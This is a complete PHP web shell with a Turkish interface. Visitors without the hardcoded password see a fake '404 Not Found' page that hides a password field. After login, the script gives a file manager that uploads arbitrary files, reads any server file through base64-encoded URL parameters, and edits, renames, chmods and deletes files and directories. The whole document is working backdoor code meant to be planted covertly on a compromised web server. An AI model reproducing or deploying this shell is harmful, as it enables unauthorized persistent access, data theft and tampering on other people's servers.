<?
error_reporting(0);
set_time_limit(0);
@session_start();
@set_time_limit(0);
if((isset($v) AND $v==0) OR (isset($t) AND $t==false)){
die('');
}
$create_password = true;
$password = "mmmmmm";
$pass=$_POST['pass'];
if($pass==$password){
$_SESSION['nst']="$pass";
}
if($create_password==true){
if(!isset($_SESSION['nst']) or $_SESSION['nst']!=$password){
$resim = base64_decode("");
die("


<html>
<head><title>404 Not Found</title></head>

<style>  *
                            { 
                                padding:0px;
                                margin:0px;
                            }         
</style>




<center><body background=white<table width=1 >


</center>


<body>
<form method=post><strong>
<br><h1>Not Found</h1><br>
<p>The requested URL was not found on this server.</p><br><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>
</body><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
<style>input { margin:5; border:none;cursor:arrow; }</style>


<!-- 




 _   _                   _           _    _                                  
| \ | | ___ _   _  ___  | |__   __ _| | _(_)_   _  ___  _ __ ___ _   _ _ __  
|  \| |/ _ \ | | |/ _ \ | '_ \ / _` | |/ / | | | |/ _ \| '__/ __| | | | '_ \ 
| |\  |  __/ |_| |  __/ | |_) | (_| |   <| | |_| | (_) | |  \__ \ |_| | | | |
|_| \_|\___|\__, |\___| |_.__/ \__,_|_|\_\_|\__, |\___/|_|  |___/\__,_|_| |_|
            |___/                           |___/                            
 _          
| |__   ___ 
| '_ \ / _ \
| |_) |  __/
|_.__/ \___|
            
                 _             _             _                             
  __ _ _ __ ___ (_)_ __   __ _| | _____   __| |_   _  __ _ _   _ _ __ ___  
 / _` | '_ ` _ \| | '_ \ / _` | |/ / _ \ / _` | | | |/ _` | | | | '_ ` _ \ 
| (_| | | | | | | | | | | (_| |   < (_) | (_| | |_| | (_| | |_| | | | | | |
 \__,_|_| |_| |_|_|_| |_|\__,_|_|\_\___/ \__,_|\__,_|\__, |\__,_|_| |_| |_|
                                                     |___/                 
                           _       
 _   _ _ __     ___   __ _| |_   _ 
| | | | '_ \   / _ \ / _` | | | | |
| |_| | | | | | (_) | (_| | | |_| |
 \__,_|_| |_|  \___/ \__, |_|\__,_|
                     |___/         
                              şaka şaka gül diye


-->
</strong><br><input type=password name=pass size=10></form>

");}
}

if(get_magic_quotes_gpc()){
    foreach($_POST as $key=>$value){
        $_POST[$key] = stripslashes($value);
    }
}

echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
<title></title>
<style>


body{
    font-family: "Typesenses", cursive;
    background-image:url();
    background-position:fixed;
    text-shadow:text-shadow:black 2px 0px 12px; color:#6A0888;
}

#content tr:hover{
    background-color: #FFBF00;
    color:#6A0888;
}
#content .first{
    background-color: #FFBF00;
}
#content .first:hover{
    background-color:  #FFBF00;
    color:#6A0888;
}
table{
    border: 1px #FEFEFE dotted;
}
H1{
    font-family: "Typesenses", cursive;
}
a{
    color: black;
    text-decoration: none;
}
a:hover{
    color: black;
    color:black;
}


input,select,textarea{
    border: 1px #000000 solid;
    -moz-border-radius: 5px;
    -webkit-border-radius:5px;
    border-radius:5px;
}
</style>
</HEAD>
<BODY>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>Bulundu&#287;un Yer : ';
if(isset($_GET['path'])){
    $path = base64_decode($_GET['path']);
}else{
    $path = getcwd();
}
$pathen = base64_encode($path);
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
    if($pat == '' && $id == 0){
        $a = true;
        echo '<a href="?path='.base64_encode("/").'">/</a>';
        continue;
    }
    if($pat == '') continue;
    echo '<a href="?path=';
    $linkpath = '';
    for($i=0;$i<=$id;$i++){
        $linkpath .= "$paths[$i]";
        if($i != $id) $linkpath .= "/";
    }
    echo base64_encode($linkpath);
    echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
    if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
        echo '<font color="green">Dosya Upload Edildi</font><br />';
    }else{
        echo '<font color="yellow">Dosya Upload Edilemedi :(</font><br />';
    }
}
echo '<form enctype="multipart/form-data" method="POST">
Dosya Upload : <input type="file" name="file" />
<input type="submit" value="upload" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
    echo "<tr><td>Bulundu&#287;un Dosya : ";
    echo base64_decode($_GET['filesrc']);
    echo '</tr></td></table><br />';
    echo('<pre>'.htmlspecialchars(file_get_contents(base64_decode($_GET['filesrc']))).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
    echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
    if($_POST['opt'] == 'chmod'){
        if(isset($_POST['perm'])){
            if(chmod($_POST['path'],$_POST['perm'])){
                echo '<font color="green">&#304;zinler De&#287;i&#351;tirildi</font><br />';
            }else{
                echo '<font color="yellow">&#304;zinler De&#287;i&#351;tirilemedi :(</font><br />';
            }
        }
        echo '<form method="POST">
        Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="chmod">
        <input type="submit" value="Go" />
        </form>';
    }elseif($_POST['opt'] == 'rename'){
        if(isset($_POST['newname'])){
            if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
                echo '<font color="green">Ad De&#287;i&#351;tirme Ba&#351;ar&#305;l&#305;</font><br />';
            }else{
                echo '<font color="red">Ad De&#287;i&#351;tirilemedi :(</font><br />';
            }
            $_POST['name'] = $_POST['newname'];
        }
        echo '<form method="POST">
        New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="rename">
        <input type="submit" value="Go" />
        </form>';
    }elseif($_POST['opt'] == 'edit'){
        if(isset($_POST['src'])){
            $fp = fopen($_POST['path'],'w');
            if(fwrite($fp,$_POST['src'])){
                echo '<font color="green">D&#252;zenleme Ba&#351;ar&#305;l&#305;</font><br />';
            }else{
                echo '<font color="red">D&#252;zenleme Ba&#351;ar&#305;s&#305;z :/</font><br />';
            }
            fclose($fp);
        }
        echo '<form method="POST">
        <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="edit">
        <input type="submit" value="Go" />
        </form>';
    }
    echo '</center>';
}else{
    echo '</table><br /><center>';
    if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
        if($_POST['type'] == 'dir'){
            if(rmdir($_POST['path'])){
                echo '<font color="green">Dosya Silindi</font><br />';
            }else{
                echo '<font color="red">Dosya Silinemedi :/</font><br />';
            }
        }elseif($_POST['type'] == 'file'){
            if(unlink($_POST['path'])){
                echo '<font color="green">Dosya Silindi</font><br />';
            }else{
                echo '<font color="red">Dosya Silinemedi :/</font><br />';
            }
        }
    }
    echo '</center>';
    $scandir = scandir($path);
    echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
    <tr class="first">
        <td><center>Ad&#305;</center></td>
        <td><center>Boyut</center></td>
        <td><center>&#304;zinler</center></td>
        <td><center>Se&#231;enekler</center></td>
    </tr>';

    foreach($scandir as $dir){
        if(!is_dir("$path/$dir") || $dir == '.' || $dir =='..') continue;$dirlink =base64_encode("$path/$dir");
        echo "<tr>
        <td><a href=\"?path=$dirlink\">$dir</a></td>
        <td><center>--</center></td>
        <td><center>";
        if(is_writable("$path/$dir")) echo '<font color="green">';
        elseif(!is_readable("$path/$dir")) echo '<font color="yellow">';
        echo perms("$path/$dir");
        if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
        
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=$pathen\"><selectname=\"opt\"><option value=\"\"></option>
        <option value=\"delete\">Sil</option>
        <option value=\"chmod\">&#304;zinler</option>
        <option value=\"rename\">Yeniden Adland&#305;r</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"dir\">
        <input type=\"hidden\" name=\"name\" value=\"$dir\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }
    echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
    foreach($scandir as $file){
        if(!is_file("$path/$file")) continue;
        $size = filesize("$path/$file")/1024;$size = round($size,3);
        if($size >= 1024){$size =round($size/1024,2).' MB';}else{$size = $size.' KB';}$filelink= base64_encode("$path/$file");
        echo "<tr>
        <td><ahref=\"?filesrc=$filelink&path=$pathen\">$file</a></td><td><center>".$size."</center></td><td><center>";if(is_writable("$path/$file")) echo '<font color="green">';
        elseif(!is_readable("$path/$file"))echo '<font color="yellow">';
        echo perms("$path/$file");
        if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=$pathen\">
        <select name=\"opt\">
        <option value=\"\"></option>
        <option value=\"delete\">Sil</option>
        <option value=\"chmod\">&#304;zinler</option>
        <option value=\"rename\">Yeniden Adland&#305;r</option>
        <option value=\"edit\">D&#252;zenle</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"file\">
        <input type=\"hidden\" name=\"name\" value=\"$file\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$file\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }
    echo '</table>
    </div>';
}
echo '
</BODY>
</HTML>';
function perms($file){
    $perms = @fileperms($file);

if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
} else {
    // Unknown
    $info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}
?>